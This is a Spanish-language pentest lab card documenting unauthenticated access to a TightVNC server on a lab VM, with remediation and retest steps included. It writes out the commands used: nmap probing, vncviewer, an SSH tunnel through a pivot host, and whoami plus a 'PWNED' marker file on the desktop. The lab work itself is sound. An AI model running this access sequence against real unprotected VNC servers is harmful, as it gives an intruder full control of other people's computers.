# C4 · TightVNC sin autenticación

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M5 `10.10.10.15` |
| Servicio | TightVNC 2.8.90 |
| Configuración | autenticación **None** en `:5900` |
| CWE | CWE-306 |
| CVSS | ~9.8 ambiental |
| NVD | Sin CVE (configuración) |
| Artefacto | `artifacts/vulnerable/tightvnc-2.8.90-gpl-setup-64bit.msi` |
| Estado | **Validada** (escritorio + `whoami`) |

## 2. Precondiciones

- `tvnserver` activo.
- `:5900` accesible desde M1/pivote.
- Autenticación None.

## 3. Flujo

1. Snapshot M5: `previo-a-C4`.
2. Verificar:

```bash
nmap -sT --script vnc-info -p 5900 10.10.10.15
```

3. Conectar:

```bash
vncviewer 10.10.10.15
# o por túnel:
ssh -L 5900:10.10.10.15:5900 ubuntu@10.10.10.11 -N
vncviewer 127.0.0.1:5900
```

4. En el escritorio, abrir `cmd` y ejecutar:

```powershell
whoami
hostname
echo PWNED-M5 %DATE% %TIME% > C:\Users\cliente\Desktop\PWNED-M5.txt
```

## 4. Resultado esperado

```text
RFB 003.008
Authentication: None
...
desktop-dt5f05n\cliente
```

## 5. Evidencia

- `EV-C4-01`: `vnc-info` con None.
- `EV-C4-02`: escritorio.
- `EV-C4-03`: `whoami`.
- `EV-C4-04`: marcador `PWNED-M5.txt`.
- `LOG-C4`.

## 6. Impacto y siguiente salto

- Control gráfico total de la estación del usuario.
- Cierre de la cadena 5/5.
- Demostración visual para la sustentación.

## 7. Fallback

- Si el firewall bloquea, usar el túnel SSH por M1.
- Si VNC no conecta, mostrar `EV-C4-01` y el `nmap --script vnc-info`.

## 8. Remediación

- Contraseña fuerte en TightVNC.
- Escuchar solo en `localhost` y usar túnel SSH.
- Regla de firewall o desinstalar.

## 9. Retest

```bash
nmap -sT --script vnc-info -p 5900 10.10.10.15
vncviewer 10.10.10.15
```

Esperado: `Authentication: VNC` o `filtered`; pide clave.

## 10. EARS

- **REQ-C4-01 (Evento).** CUANDO se valide C4, el laboratorio DEBE capturar el escritorio sin clave y `whoami`.
- **REQ-C4-02 (Ubicuo).** La remediación DEBE exigir autenticación o cerrar el puerto.

## 11. Checklist

- [ ] Snapshot `previo-a-C4`.
- [ ] `vnc-info`.
- [ ] Escritorio.
- [ ] `whoami` + marcador.
- [ ] Evidencia.
- [ ] Remediación.
- [ ] Retest.
